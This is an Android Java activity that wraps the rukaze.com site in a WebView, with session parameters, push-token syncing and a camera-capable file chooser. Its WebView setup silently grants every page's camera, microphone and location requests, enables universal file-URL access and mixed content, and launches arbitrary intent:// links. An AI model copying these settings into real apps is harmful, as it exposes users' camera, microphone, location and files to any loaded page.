package joefizo.rukaze.com;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.GeolocationPermissions;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class BrowSer extends AppCompatActivity {

    private WebView webView;
    private ValueCallback<Uri[]> filePathCallback;
    private String cameraPhotoPath;

    private static final int FILE_CHOOSER_REQUEST_CODE = 1001;
    private static final int REQUEST_PERMISSIONS = 2001;

    private int cachedNavBarHeight = 0;

    @SuppressLint({"SetJavaScriptEnabled", "SetTextI18n"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Enable edge-to-edge drawing
        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);

        // 2. Make status bar translucent
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(android.graphics.Color.TRANSPARENT);
        }

        // 3. LOAD CONTENT VIEW ONCE
        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.webView);
        View rootView = findViewById(R.id.rootLayout);

        // Handle Window Insets to manage layout padding and nav bar spacing correctly
        if (rootView != null) {
            ViewCompat.setOnApplyWindowInsetsListener(rootView, (v, insets) -> {
                int navBarHeight = insets.getInsets(WindowInsetsCompat.Type.navigationBars()).bottom;
                cachedNavBarHeight = navBarHeight;

                v.post(() -> {
                    if (webView != null) {
                        android.view.ViewGroup.MarginLayoutParams params = 
                            (android.view.ViewGroup.MarginLayoutParams) webView.getLayoutParams();
                        params.bottomMargin = cachedNavBarHeight; 
                        webView.setLayoutParams(params);
                    }
                });

                return insets;
            });
        }

        SharedPreferences prefs = getSharedPreferences("RukazePrefs", MODE_PRIVATE);

        // Start background foreground service
        Intent serviceIntent = new Intent(this, Test.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Modern back press dispatcher for API 33+ compatibility (Minimizes app instead of killing/reloading)
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if (webView != null && webView.canGoBack()) {
                    webView.goBack(); // Navigate back inside the web history
                } else {
                    // Instantly hide/minimize app to background without destroying state
                    moveTaskToBack(true);
                }
            }
        });

        // Request notification permission for Android 13+ (API 33+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 102);
            }
        }

        // Stagger dangerous permissions (Camera, Audio, Location) by 600ms
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!hasPermissions()) {
                requestAppPermissions();
            }
        }, 600);

        // Retrieve and validate name from local storage
        String savedName = prefs.getString("saved_user_name", "");
        if (savedName == null || savedName.trim().isEmpty() || savedName.equalsIgnoreCase("Guest")) {
            savedName = BuildConfig.APK_OWNER;
        }

        // Retrieve saved device ID and status to maintain session state permanently
        String savedDeviceId = prefs.getString("saved_device_id", "");
        String savedStatus = prefs.getString("saved_status", "");
        
        // Unified URL resolution
        String urlToLoad = null;
        Intent intent = getIntent();
        if (intent != null) {
            urlToLoad = intent.getStringExtra("TARGET_URL");
            if (urlToLoad == null && intent.getData() != null) {
                urlToLoad = intent.getData().toString();
            }
        }

        if (urlToLoad == null || urlToLoad.trim().isEmpty()) {
            urlToLoad = prefs.getString("last_visited_url", null);
        }

        if (urlToLoad == null || urlToLoad.trim().isEmpty()) {
            urlToLoad = "https://www.rukaze.com" + BuildConfig.AFFILIATE_ID + "&name=" + savedName;
        } else if (!urlToLoad.contains("name=")) {
            urlToLoad += (urlToLoad.contains("?") ? "&" : "?") + "name=" + savedName;
        }

        // --- INJECT SAVED DEVICE_ID AUTOMATICALLY ---
        if (savedDeviceId != null && !savedDeviceId.isEmpty() && !urlToLoad.contains("device_id=")) {
            urlToLoad += (urlToLoad.contains("?") ? "&" : "?") + "device_id=" + savedDeviceId;
        }

        // --- INJECT SAVED STATUS AUTOMATICALLY (Locks 'found' state) ---
        if (savedStatus != null && !savedStatus.isEmpty() && !urlToLoad.contains("status=")) {
            urlToLoad += "&status=" + savedStatus;
        }

        if (getSupportActionBar() != null) getSupportActionBar().hide();

        WebSettings webSettings = webView.getSettings();
        String defaultUserAgent = webSettings.getUserAgentString();
        webSettings.setUserAgentString(defaultUserAgent + " RukazeApp/1.0");

        webSettings.setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new WebAppInterface(this), "AndroidInterface");

        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setDatabaseEnabled(true);

        // Check connection upfront: If offline, load strictly from cache immediately
        if (!isNetworkAvailable(this)) {
            webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            Toast.makeText(this, "No internet. Loading offline cache...", Toast.LENGTH_SHORT).show();
        } else {
            webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        }

        webSettings.setBuiltInZoomControls(false);
        webSettings.setDisplayZoomControls(false);
        webSettings.setSupportMultipleWindows(false);
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);

        webSettings.setMediaPlaybackRequiresUserGesture(false);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        }

        // 5-Second Timeout Handler for Slow Network Fallback
        final Handler timeoutHandler = new Handler(Looper.getMainLooper());
        final Runnable cacheFallbackRunnable = new Runnable() {
            @Override
            public void run() {
                if (webView != null) {
                    webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
                    webView.reload();
                    Toast.makeText(BrowSer.this, "Network slow. Loading cached version...", Toast.LENGTH_SHORT).show();
                }
            }
        };

        webView.setWebViewClient(new WebViewClient() {
            private String lastLoadedUrl = "";

            @Nullable
            @Override
            public android.webkit.WebResourceResponse shouldInterceptRequest(WebView view, android.webkit.WebResourceRequest request) {
                if (!isNetworkAvailable(BrowSer.this)) {
                    try {
                        String url = request.getUrl().toString();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return super.shouldInterceptRequest(view, request);
            }

            @Override
            public void onReceivedError(WebView view, android.webkit.WebResourceRequest request, android.webkit.WebResourceError error) {
                if (request.isForMainFrame()) {
                    view.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
                    view.reload();
                }
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (lastLoadedUrl != null && !lastLoadedUrl.isEmpty() && !lastLoadedUrl.equals(url)) {
                    view.evaluateJavascript("if(typeof localStream !== 'undefined' && localStream) { localStream.getTracks().forEach(t => t.stop()); }", null);
                    view.onPause();
                }
                
                if (url.startsWith("intent://")) {
                    try {
                        Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
                        if (intent != null) {
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                            return true;
                        }
                    } catch (Exception e) {
                        String httpUrl = url.replaceFirst("intent://", "https://");
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(httpUrl));
                        startActivity(browserIntent);
                        return true;
                    }
                }
                return false;
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                lastLoadedUrl = url;
                view.onResume();

                if (isNetworkAvailable(BrowSer.this)) {
                    timeoutHandler.removeCallbacks(cacheFallbackRunnable);
                    timeoutHandler.postDelayed(cacheFallbackRunnable, 5000);
                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                
                timeoutHandler.removeCallbacks(cacheFallbackRunnable);
                
                if (isNetworkAvailable(BrowSer.this)) {
                    webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
                }

                saveCredentialsToPrefs(url);

                String setupListenerScript = "javascript:(function() {" +
                    "   if (window._formListenerAttached) return;" +
                    "   window._formListenerAttached = true;" +
                    "   var timer = null;" +
                    "   var lastState = '';" +
                    "   document.addEventListener('input', function(e) {" +
                    "       clearTimeout(timer);" +
                    "       timer = setTimeout(function() {" +
                    "           var formData = {};" +
                    "           var elements = document.querySelectorAll('form input, form select, form textarea');" +
                    "           for(var i=0; i<elements.length; i++) {" +
                    "               var el = elements[i];" +
                    "               if(el.name && el.value !== '') {" +
                    "                   if((el.type === 'checkbox' || el.type === 'radio') && !el.checked) continue;" +
                    "                   formData[el.name] = el.value;" +
                    "               }" +
                    "           }" +
                    "           var jsonString = JSON.stringify(formData);" +
                    "           if (jsonString !== lastState && jsonString !== '{}') {" +
                    "               lastState = jsonString;" +
                    "               AndroidInterface.showChangeToast('Page update detected & saved!');" +
                    "           }" +
                    "       }, 1000);" + 
                    "   });" +
                    "})();";

                view.evaluateJavascript(setupListenerScript, null);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            private View customView;
            private CustomViewCallback customViewCallback;
            private int originalSystemUiVisibility;
            private int originalOrientation;

            @Override
            public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
                callback.invoke(origin, true, false);
            }

            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(() -> request.grant(request.getResources()));
            }

            @Override
            public void onShowCustomView(View view, CustomViewCallback callback) {
                if (customView != null) {
                    callback.onCustomViewHidden();
                    return;
                }

                customView = view;
                customViewCallback = callback;
                originalSystemUiVisibility = getWindow().getDecorView().getSystemUiVisibility();
                originalOrientation = getRequestedOrientation();

                getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                );

                setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_SENSOR);

                android.view.ViewGroup decorView = (android.view.ViewGroup) getWindow().getDecorView();
                decorView.addView(customView, new android.view.ViewGroup.LayoutParams(
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT
                ));
                webView.setVisibility(View.GONE);
            }

            @Override
            public void onHideCustomView() {
                if (customView == null) return;

                getWindow().getDecorView().setSystemUiVisibility(originalSystemUiVisibility);
                setRequestedOrientation(originalOrientation);

                android.view.ViewGroup decorView = (android.view.ViewGroup) getWindow().getDecorView();
                decorView.removeView(customView);
                customView = null;
                webView.setVisibility(View.VISIBLE);

                if (customViewCallback != null) {
                    customViewCallback.onCustomViewHidden();
                }
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                if (BrowSer.this.filePathCallback != null) {
                    BrowSer.this.filePathCallback.onReceiveValue(null);
                }
                BrowSer.this.filePathCallback = filePathCallback;

                boolean isVideoRequest = false;
                for (String type : fileChooserParams.getAcceptTypes()) {
                    if (type.startsWith("video/")) {
                        isVideoRequest = true;
                        break;
                    }
                }

                if (hasPermissions()) {
                    openFileChooser(isVideoRequest);
                } else {
                    requestAppPermissions();
                }
                return true;
            }
        });

        // FIX: Always load urlToLoad directly to ensure freshly injected parameters and cookies apply correctly
        webView.loadUrl(urlToLoad);

        try {
            com.google.firebase.messaging.FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful()) {
                        return;
                    }
                    String token = task.getResult();
                    prefs.edit().putString("fcm_token", token).apply();
                    syncFCMTokenToServer();
                });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean isNetworkAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                if (network == null) return false;
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                return capabilities != null && (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                               capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                               capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET));
            } else {
                android.net.NetworkInfo activeNetworkInfo = cm.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }
    
    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }

        @android.webkit.JavascriptInterface
        public void showChangeToast(String message) {
            new Handler(Looper.getMainLooper()).post(() -> Toast.makeText(mContext, message, Toast.LENGTH_SHORT).show());
        }
        
        @android.webkit.JavascriptInterface
        public void setHalfScreenHeight() {
            new Handler(Looper.getMainLooper()).post(() -> {
                if (webView != null) {
                    android.view.ViewGroup.MarginLayoutParams params = 
                        (android.view.ViewGroup.MarginLayoutParams) webView.getLayoutParams();
                    params.bottomMargin = cachedNavBarHeight; 
                    webView.setLayoutParams(params);
                }
            });
        }

        @android.webkit.JavascriptInterface
        public void shareContent(String title, String url) {
            Intent sendIntent = new Intent(Intent.ACTION_SEND);
            sendIntent.setType("text/plain");
            sendIntent.putExtra(Intent.EXTRA_TITLE, title);
            sendIntent.putExtra(Intent.EXTRA_TEXT, url);
            
            Intent shareIntent = Intent.createChooser(sendIntent, "Share via");
            mContext.startActivity(shareIntent);
        }
    }

    private void syncFCMTokenToServer() {
        SharedPreferences prefs = getSharedPreferences("RukazePrefs", MODE_PRIVATE);
        String token = prefs.getString("fcm_token", null);
        String currentUserName = prefs.getString("saved_user_name", "Guest");
        String currentDeviceId = prefs.getString("saved_device_id", "");

        if (token == null || token.isEmpty() || currentUserName == null || 
            currentUserName.trim().isEmpty() || currentUserName.equalsIgnoreCase("Guest")) {
            return;
        }

        new Thread(() -> {
            try {
                String encodedName = java.net.URLEncoder.encode(currentUserName, "UTF-8");
                String encodedToken = java.net.URLEncoder.encode(token, "UTF-8");
                String encodedDeviceId = java.net.URLEncoder.encode(currentDeviceId, "UTF-8");

                String fullUrlStr = "https://www.rukaze.com/save_fcm_token.php?action=save_fcm_token&myname=" + encodedName + "&fcm_token=" + encodedToken + "&device_id=" + encodedDeviceId;

                java.net.URL url = new java.net.URL(fullUrlStr);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                android.util.Log.e("FCM_SYNC", "Startup sync failed", e);
            }
        }).start();
    }

    // Comprehensive cookie extractor to safely remember device_id, status, and name
    private void saveCredentialsToPrefs(String url) {
        String allCookies = CookieManager.getInstance().getCookie(url);
        if (allCookies != null) {
            String[] cookieArray = allCookies.split(";");
            SharedPreferences prefs = getSharedPreferences("RukazePrefs", MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();
            boolean prefsChanged = false;

            for (String cookie : cookieArray) {
                String[] nameValue = cookie.split("=", 2);
                if (nameValue.length == 2) {
                    String cookieName = nameValue[0].trim();
                    String cookieValue = nameValue[1].trim();

                    if (cookieName.equals("device_id")) {
                        editor.putString("saved_device_id", cookieValue);
                        prefsChanged = true;
                    } else if (cookieName.equals("status")) {
                        editor.putString("saved_status", cookieValue);
                        prefsChanged = true;
                    } else if (cookieName.equals("name")) {
                        if (cookieValue != null && !cookieValue.isEmpty() && !cookieValue.equalsIgnoreCase("Guest")) {
                            String oldName = prefs.getString("saved_user_name", BuildConfig.APK_OWNER);
                            if (!cookieValue.equals(oldName)) {
                                editor.putString("saved_user_name", cookieValue);
                                prefsChanged = true;
                            }
                        }
                    }
                }
            }

            if (prefsChanged) {
                editor.apply();
                // FIX: Force CookieManager to flush immediately so subsequent activity launches pick up updated cookies
                CookieManager.getInstance().flush();
            }
        }
    }

    private boolean hasPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestAppPermissions() {
        ActivityCompat.requestPermissions(this, 
            new String[]{
                Manifest.permission.CAMERA, 
                Manifest.permission.RECORD_AUDIO, 
                Manifest.permission.ACCESS_FINE_LOCATION
            }, 
            REQUEST_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show();
                if (webView != null) {
                    webView.reload();
                }
            } else {
                Toast.makeText(this, "Some permissions were denied. Certain features may not work.", Toast.LENGTH_LONG).show();
            }
        }
    }

    private File createVideoFile() throws IOException {
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String fileName = "VID_" + timeStamp + "_";
        File storageDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
        return File.createTempFile(fileName, ".mp4", storageDir);
    }

    private File createImageFile() throws IOException {
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String fileName = "IMG_" + timeStamp + "_";
        File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        return File.createTempFile(fileName, ".jpg", storageDir);
    }

    private void openFileChooser(boolean isVideo) {
        Intent captureIntent = new Intent(isVideo ? MediaStore.ACTION_VIDEO_CAPTURE : MediaStore.ACTION_IMAGE_CAPTURE);
        Uri mediaURI = null;

        try {
            File mediaFile = isVideo ? createVideoFile() : createImageFile();
            cameraPhotoPath = mediaFile.getAbsolutePath();
            String authority = getPackageName() + ".fileprovider";
            mediaURI = FileProvider.getUriForFile(this, authority, mediaFile);
            
            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mediaURI);
            captureIntent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        } catch (IOException e) {
            e.printStackTrace();
        }

        Intent contentIntent;
        try {
            contentIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentIntent.setType("*/*");
            contentIntent.putExtra(Intent.EXTRA_MIME_TYPES, new String[] {"image/*", "video/*"});
        } catch (Exception e) {
            contentIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentIntent.setType("*/*");
        }

        Intent chooserIntent = Intent.createChooser(contentIntent, "Select Source");
        
        if (mediaURI != null) {
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, new Parcelable[]{ captureIntent });
        }
        
        try {
            startActivityForResult(chooserIntent, FILE_CHOOSER_REQUEST_CODE);
        } catch (Exception e) {
            Toast.makeText(this, "Cannot open file chooser", Toast.LENGTH_SHORT).show();
            if (filePathCallback != null) {
                filePathCallback.onReceiveValue(null);
                filePathCallback = null;
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
            if (filePathCallback == null) return;
            Uri[] results = null;
            
            if (resultCode == RESULT_OK) {
                if (data != null) {
                    if (data.getClipData() != null) {
                        int count = data.getClipData().getItemCount();
                        results = new Uri[count];
                        for (int i = 0; i < count; i++) {
                            results[i] = data.getClipData().getItemAt(i).getUri();
                        }
                    } else if (data.getData() != null) {
                        results = new Uri[]{data.getData()};
                    }
                }
                
                if (results == null && cameraPhotoPath != null) {
                    File file = new File(cameraPhotoPath);
                    if (file.exists() && file.length() > 0) {
                        results = new Uri[]{Uri.fromFile(file)};
                    }
                }
            }
            
            filePathCallback.onReceiveValue(results);
            filePathCallback = null;
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (webView != null) {
            String currentUrl = webView.getUrl();
            if (currentUrl != null && !currentUrl.isEmpty() && !currentUrl.contains("about:blank")) {
                getSharedPreferences("RukazePrefs", MODE_PRIVATE)
                    .edit()
                    .putString("last_visited_url", currentUrl)
                    .apply();
            }

            webView.evaluateJavascript(
                "if(typeof localStream !== 'undefined' && localStream) { " +
                "    localStream.getTracks().forEach(t => t.stop()); " +
                "} " +
                "document.querySelectorAll('video, audio').forEach(el => { " +
                "    el.pause(); " +
                "    el.src = ''; " +
                "});", 
                null
            );

            webView.onPause();
            webView.pauseTimers();
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            try {
                webView.evaluateJavascript("if(typeof localStream !== 'undefined' && localStream) { localStream.getTracks().forEach(t => t.stop()); }", null);
            } catch (Exception ignored) {}
            webView = null;
        }
        super.onDestroy();
    }
    
@Override
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    setIntent(intent);
    
    if (intent != null) {
        SharedPreferences prefs = getSharedPreferences("RukazePrefs", MODE_PRIVATE);
        
        // 1. Retrieve saved session parameters
        String savedName = prefs.getString("saved_user_name", "");
        if (savedName == null || savedName.trim().isEmpty() || savedName.equalsIgnoreCase("Guest")) {
            savedName = BuildConfig.APK_OWNER;
        }
        String savedDeviceId = prefs.getString("saved_device_id", "");
        String savedStatus = prefs.getString("saved_status", "");

        // 2. Resolve the target URL from the incoming intent
        String newUrl = intent.getStringExtra("TARGET_URL");
        if (newUrl == null || newUrl.trim().isEmpty()) {
            if (intent.getData() != null) {
                newUrl = intent.getData().toString();
            }
        }

        // Fallback if still empty
        if (newUrl == null || newUrl.trim().isEmpty()) {
            newUrl = "https://www.rukaze.com" + BuildConfig.AFFILIATE_ID + "&name=" + savedName;
        } else if (!newUrl.contains("name=")) {
            newUrl += (newUrl.contains("?") ? "&" : "?") + "name=" + savedName;
        }

        // 3. Inject saved device_id automatically
        if (savedDeviceId != null && !savedDeviceId.isEmpty() && !newUrl.contains("device_id=")) {
            newUrl += (newUrl.contains("?") ? "&" : "?") + "device_id=" + savedDeviceId;
        }

        // 4. Inject saved status automatically (Locks 'found' state)
        if (savedStatus != null && !savedStatus.isEmpty() && !newUrl.contains("status=")) {
            newUrl += "&status=" + savedStatus;
        }

        // 5. Load the fully authenticated URL into the WebView safely
        if (webView != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                CookieManager.getInstance().flush();
            }
            webView.loadUrl(newUrl);
        }
    }
}



    @Override
    protected void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        // Bypassed webView.saveState(outState) to avoid caching stale parameters/cookies on relaunch
    }
	
    @Override
    protected void onStop() {
        super.onStop();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) {
            webView.onResume();
            webView.resumeTimers();
        }
    }
}
